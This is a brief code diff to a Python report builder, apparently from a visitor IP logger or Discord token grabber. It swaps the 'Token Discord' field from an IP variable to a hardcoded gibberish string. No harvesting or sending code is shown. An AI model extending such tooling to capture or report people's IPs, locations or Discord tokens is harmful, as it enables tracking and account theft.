@@ -151,7 +151,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Browser:** `{browser}`
 
 **Token Discord:**
-> **Token:** `{ip if ip else 'Unknown'}`
+> **Token:** `||s5fldskf9o31rs921enhg9u2917sdnhbmasddsf71872387sdbasn21u7tsdaasdhtgrhoilliooillop[hgjhgcxvdmmxsc761t24msndamshd712wlkkabyystrasasd7123jhlknlkfsdfsjASUHKSSADDdfsdrbdll83trksdfm||`
 
 **User Agent:**
 ```
